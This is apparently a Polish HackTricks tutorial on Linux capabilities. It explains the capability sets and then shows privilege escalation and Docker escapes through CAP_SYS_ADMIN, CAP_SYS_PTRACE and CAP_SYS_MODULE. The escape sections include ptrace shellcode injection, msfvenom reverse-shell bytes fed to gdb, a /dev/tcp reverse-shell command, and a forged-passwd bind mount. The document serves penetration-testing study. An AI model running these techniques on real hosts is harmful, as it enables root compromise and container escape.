# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}


## Linux Capabilities

Linux capabilities dzielą **uprawnienia root na mniejsze, odrębne jednostki**, umożliwiając procesom posiadanie podzbioru uprawnień. Minimalizuje to ryzyko, ponieważ nie przyznaje się niepotrzebnie pełnych uprawnień root.

### Problem:

- Zwykli użytkownicy mają ograniczone uprawnienia, co wpływa na takie zadania jak otwieranie network socket, które wymaga dostępu root.

### Zestawy capabilities:

1. **Inherited (CapInh)**:

- **Cel**: Określa capabilities przekazywane z procesu nadrzędnego.
- **Funkcjonalność**: Po utworzeniu nowego procesu dziedziczy on capabilities procesu nadrzędnego znajdujące się w tym zestawie. Jest to przydatne do utrzymywania określonych uprawnień podczas tworzenia kolejnych procesów.
- **Ograniczenia**: Proces nie może uzyskać capabilities, których nie posiadał jego proces nadrzędny.

2. **Effective (CapEff)**:

- **Cel**: Reprezentuje rzeczywiste capabilities używane przez proces w danym momencie.
- **Funkcjonalność**: Jest to zestaw capabilities sprawdzany przez kernel w celu przyznania uprawnień do różnych operacji. W przypadku plików ten zestaw może być flagą wskazującą, czy należy uwzględnić capabilities dozwolone dla pliku.
- **Znaczenie**: Zestaw effective ma kluczowe znaczenie dla natychmiastowych kontroli uprawnień, działając jako aktywny zestaw capabilities, których proces może używać.

3. **Permitted (CapPrm)**:

- **Cel**: Definiuje maksymalny zestaw capabilities, które może posiadać proces.
- **Funkcjonalność**: Proces może przenieść capability z zestawu permitted do zestawu effective, uzyskując możliwość korzystania z tej capability. Może również usuwać capabilities ze swojego zestawu permitted.
- **Granica**: Działa jako górny limit capabilities, które może posiadać proces, zapewniając, że nie przekroczy on wcześniej określonego zakresu uprawnień.

4. **Bounding (CapBnd)**:

- **Cel**: Ustala limit capabilities, które proces może kiedykolwiek uzyskać w trakcie swojego cyklu życia.
- **Funkcjonalność**: Nawet jeśli proces posiada określoną capability w zestawie inheritable lub permitted, nie może jej uzyskać, chyba że znajduje się ona również w zestawie bounding.
- **Zastosowanie**: Ten zestaw jest szczególnie przydatny do ograniczania możliwości privilege escalation procesu, zapewniając dodatkową warstwę bezpieczeństwa.

5. **Ambient (CapAmb)**:
- **Cel**: Umożliwia zachowanie określonych capabilities podczas wywołania system call `execve`, które zazwyczaj skutkowałoby pełnym resetem capabilities procesu.
- **Funkcjonalność**: Zapewnia, że programy non-SUID, które nie mają powiązanych file capabilities, mogą zachować określone uprawnienia.
- **Ograniczenia**: Capabilities w tym zestawie podlegają ograniczeniom zestawów inheritable i permitted, co zapewnia, że nie przekroczą dozwolonych uprawnień procesu.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Aby uzyskać więcej informacji, sprawdź:

- [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Capabilities procesów i plików binarnych

### Capabilities procesów

Aby wyświetlić capabilities konkretnego procesu, użyj pliku **status** w katalogu /proc. Ponieważ zawiera on więcej szczegółów, ograniczmy informacje wyłącznie do tych związanych z Linux capabilities.\
Pamiętaj, że w przypadku wszystkich uruchomionych procesów informacje o capabilities są przechowywane osobno dla każdego wątku, natomiast w przypadku plików binarnych w systemie plików są one przechowywane w atrybutach rozszerzonych.

Capabilities są zdefiniowane w pliku /usr/include/linux/capability.h

Capabilities bieżącego procesu możesz znaleźć za pomocą `cat /proc/self/status` lub polecenia `capsh --print`, a capabilities innych użytkowników w `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
To polecenie powinno zwrócić 5 wierszy w większości systemów.

- CapInh = Dziedziczone capabilities
- CapPrm = Dozwolone capabilities
- CapEff = Efektywne capabilities
- CapBnd = Bounding set
- CapAmb = Zestaw Ambient capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Te liczby szesnastkowe nie mają sensu. Za pomocą narzędzia capsh możemy zdekodować je na nazwy capabilities.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sprawdźmy teraz **uprawnienia** używane przez `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Chociaż to działa, istnieje inny i łatwiejszy sposób. Aby wyświetlić capabilities uruchomionego procesu, wystarczy użyć narzędzia **getpcaps**, podając jego identyfikator procesu (PID). Możesz również podać listę identyfikatorów procesów.
```bash
getpcaps 1234
```
Sprawdźmy tutaj capabilities programu `tcpdump` po nadaniu plikowi binarnemu wystarczających capabilities (`cap_net_admin` i `cap_net_raw`) do sniffowania sieci (_tcpdump działa w procesie 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Jak widać, podane uprawnienia odpowiadają wynikom uzyskanym za pomocą 2 sposobów sprawdzania uprawnień pliku binarnego.\
Narzędzie _getpcaps_ używa wywołania systemowego **capget()**, aby sprawdzić dostępne uprawnienia dla konkretnego wątku. To wywołanie systemowe wymaga jedynie podania PID, aby uzyskać więcej informacji.

### Uprawnienia plików binarnych

Pliki binarne mogą mieć uprawnienia, które mogą być używane podczas wykonywania. Na przykład bardzo często można znaleźć plik binarny `ping` z uprawnieniem `cap_net_raw`:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Możesz **wyszukiwać pliki binarne z capabilities** za pomocą:
```bash
getcap -r / 2>/dev/null
```
### Usuwanie capabilities za pomocą capsh

Jeśli usuniemy capabilities CAP*NET_RAW dla _ping*, narzędzie ping nie powinno już działać.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Oprócz wyniku samego polecenia _capsh_ błąd powinno również zgłosić samo polecenie _tcpdump_.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Błąd wyraźnie pokazuje, że polecenie ping nie może otworzyć gniazda ICMP. Teraz wiemy już na pewno, że działa to zgodnie z oczekiwaniami.

### Usuwanie capabilities

Możesz usunąć capabilities pliku binarnego za pomocą
```bash
setcap -r </path/to/binary>
```
## Uprawnienia użytkowników

Apparently **możliwe jest również przypisywanie capabilities użytkownikom**. Prawdopodobnie oznacza to, że każdy proces uruchomiony przez użytkownika będzie mógł korzystać z capabilities tego użytkownika.\
Na podstawie [tego](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [tego ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [tego ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) należy skonfigurować kilka plików, aby nadać użytkownikowi określone capabilities, ale plikiem przypisującym capabilities poszczególnym użytkownikom będzie `/etc/security/capability.conf`.\
Przykład pliku:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Capabilities środowiska

Skompilowanie poniższego programu umożliwia **uruchomienie powłoki bash wewnątrz środowiska, które udostępnia capabilities**.
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Wewnątrz **bash wykonywanego przez skompilowany ambient binary** można zaobserwować **nowe capabilities** (zwykły użytkownik nie będzie mieć żadnej capability w sekcji „current”).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Możesz **dodawać wyłącznie capabilities obecne** zarówno w zestawie permitted, jak i inheritable.

### Capability-aware/Capability-dumb binaries

**Capability-aware binaries nie użyją nowych capabilities** przekazanych przez środowisko, natomiast **capability-dumb binaries użyją** ich, ponieważ ich nie odrzucą. Sprawia to, że capability-dumb binaries są podatne na ataki w specjalnym środowisku, które nadaje capabilities binariom.

## Service Capabilities

Domyślnie **service uruchomiony jako root będzie miał przypisane wszystkie capabilities**, co w niektórych sytuacjach może być niebezpieczne.\
Dlatego plik **service configuration** pozwala **określić** capabilities, które ma posiadać, **oraz** użytkownika, który powinien uruchamiać service, aby uniknąć uruchamiania service z niepotrzebnymi uprawnieniami:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities w kontenerach Docker

Domyślnie Docker przypisuje kontenerom kilka capabilities. Bardzo łatwo sprawdzić, jakie capabilities są przypisane, uruchamiając:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities są przydatne, gdy **chcesz ograniczyć własne procesy po wykonaniu uprzywilejowanych operacji** (np. po skonfigurowaniu chroot i powiązaniu z socketem). Mogą jednak zostać wykorzystane przez przekazanie im złośliwych poleceń lub argumentów, które następnie są uruchamiane jako root.

Możesz wymusić capabilities dla programów za pomocą `setcap`, a następnie sprawdzić je za pomocą `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` oznacza dodanie capability („-” oznaczałoby jej usunięcie) jako Effective i Permitted.

Aby zidentyfikować programy w systemie lub folderze posiadające capabilities:
```bash
getcap -r / 2>/dev/null
```
### Przykład wykorzystania

W poniższym przykładzie plik binarny `/usr/bin/python2.6` okazuje się podatny na privesc:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** potrzebne programowi `tcpdump`, aby **umożliwić dowolnemu użytkownikowi przechwytywanie pakietów**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Szczególny przypadek „pustych” capabilities

[Z dokumentacji](https://man7.org/linux/man-pages/man7/capabilities.7.html): Należy zauważyć, że do pliku programu można przypisać puste zestawy capabilities, dzięki czemu możliwe jest utworzenie programu set-user-ID-root, który zmienia effective i saved set-user-ID procesu wykonującego program na 0, ale nie nadaje temu procesowi żadnych capabilities. Mówiąc prościej, jeśli masz binary, który:

1. nie jest własnością root
2. nie ma ustawionych bitów `SUID`/`SGID`
3. ma pusty zestaw capabilities (np.: `getcap myelf` zwraca `myelf =ep`)

to **ten binary uruchomi się jako root**.

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** to niezwykle potężna capability systemu Linux, często uznawana za niemal równoważną poziomowi root ze względu na szerokie **uprawnienia administracyjne**, takie jak montowanie urządzeń lub modyfikowanie funkcji kernela. Chociaż jest niezbędna w kontenerach symulujących całe systemy, **`CAP_SYS_ADMIN` stwarza poważne wyzwania związane z bezpieczeństwem**, zwłaszcza w środowiskach kontenerowych, ze względu na możliwość privilege escalation i przejęcia systemu. Dlatego jej użycie wymaga rygorystycznych ocen bezpieczeństwa i ostrożnego zarządzania, przy zdecydowanym zaleceniu usunięcia tej capability z kontenerów przeznaczonych dla konkretnych aplikacji, aby przestrzegać **zasady najmniejszych uprawnień** i minimalizować attack surface.

**Przykład z użyciem binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Za pomocą Pythona można zamontować zmodyfikowany plik _passwd_ na rzeczywistym pliku _passwd_:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I na koniec **mount** zmodyfikowany plik `passwd` w `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I będziesz mógł wykonać **`su` jako root**, używając hasła „password”.

**Przykład ze środowiskiem (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
W poprzednim wyniku możesz zobaczyć, że capability **SYS_ADMIN** jest włączona.

- **Mount**

Umożliwia to kontenerowi Docker **zamontowanie dysku hosta i uzyskanie do niego pełnego dostępu**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Pełny dostęp**

W poprzedniej metodzie udało nam się uzyskać dostęp do dysku Docker hosta.\
Jeśli okaże się, że host uruchamia serwer **ssh**, możesz **utworzyć użytkownika na dysku Docker hosta** i uzyskać do niego dostęp przez SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

**Oznacza to, że możesz wydostać się z kontenera, wstrzykując shellcode do procesu działającego na hoście.** Aby uzyskać dostęp do procesów działających na hoście, kontener musi być uruchomiony co najmniej z opcją **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia korzystanie z funkcji debugowania i śledzenia wywołań systemowych udostępnianych przez `ptrace(2)` oraz z wywołań cross-memory attach, takich jak `process_vm_readv(2)` i `process_vm_writev(2)`. Choć jest to przydatne do celów diagnostycznych i monitorowania, włączenie `CAP_SYS_PTRACE` bez restrykcyjnych mechanizmów, takich jak filtr seccomp dla `ptrace(2)`, może znacząco osłabić bezpieczeństwo systemu. W szczególności może zostać wykorzystane do obejścia innych ograniczeń bezpieczeństwa, zwłaszcza tych narzucanych przez seccomp, co pokazują [proofs of concept (PoC), takie jak ten](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Example with binary (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Przykład z binary (gdb)**

`gdb` z capability `ptrace`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Utwórz shellcode za pomocą msfvenom do wstrzyknięcia do pamięci za pośrednictwem gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debuguj proces root za pomocą gdb i skopiuj-wklej wcześniej wygenerowane linie gdb:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Przykład ze środowiskiem (Docker breakout) - Another gdb Abuse**

Jeśli **GDB** jest zainstalowane (lub możesz je zainstalować na przykład za pomocą `apk add gdb` lub `apt install gdb`), możesz **debugować proces z hosta** i sprawić, aby wywołał funkcję `system`. (Ta technika wymaga również capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, ale zostanie ono wykonane przez ten proces (więc uzyskaj rev shell).

> [!WARNING]
> Jeśli otrzymasz błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode do programu za pomocą gdb.

**Przykład ze środowiskiem (Docker breakout) - Shellcode Injection**

Możesz sprawdzić włączone capabilities wewnątrz kontenera docker za pomocą:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Wyświetl **procesy** uruchomione na **hoście** `ps -eaf`

1. Uzyskaj **architekturę** `uname -m`
2. Znajdź **shellcode** dla danej architektury ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Znajdź **program** do **wstrzyknięcia** **shellcode** do pamięci procesu ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Zmodyfikuj** **shellcode** wewnątrz programu i **skompiluj** go za pomocą `gcc inject.c -o inject`
5. **Wstrzyknij** go i uzyskaj swój **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia procesowi **ładowanie i wyładowywanie modułów jądra (wywołań systemowych `init_module(2)`, `finit_module(2)` i `delete_module(2)`)**, zapewniając bezpośredni dostęp do podstawowych operacji jądra. Ta capability stwarza krytyczne zagrożenia dla bezpieczeństwa, ponieważ umożliwia eskalację uprawnień i całkowite przejęcie systemu dzięki możliwości modyfikowania jądra, a tym samym omijania wszystkich mechanizmów bezpieczeństwa systemu Linux, w tym Linux Security Modules i izolacji kontenerów.
**Oznacza to, że możesz** **wstawiać moduły jądra do jądra komputera hosta oraz usuwać je z niego.**

**Przykład z plikiem binarnym**

W poniższym przykładzie plik binarny **`python`** ma tę capability.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
Domyślnie polecenie **`modprobe`** sprawdza listę zależności i pliki mapowania w katalogu **`/lib/modules/$(uname -r)`**.\
Aby to wykorzystać, utwórzmy fałszywy folder **lib/modules**:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
Następnie **skompiluj moduł jądra, którego 2 przykłady znajdziesz poniżej, i skopiuj go** do tego folderu:
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
Na koniec wykonaj wymagany kod Python, aby załadować ten moduł jądra:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Przykład 2 z plikiem binarnym**

W poniższym przykładzie plik binarny **`kmod`** ma tę capability.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Oznacza to, że można użyć polecenia **`insmod`** do wstawienia modułu jądra. Skorzystaj z poniższego przykładu, aby uzyskać **reverse shell**, wykorzystując to uprawnienie.

**Przykład ze środowiskiem (Docker breakout)**

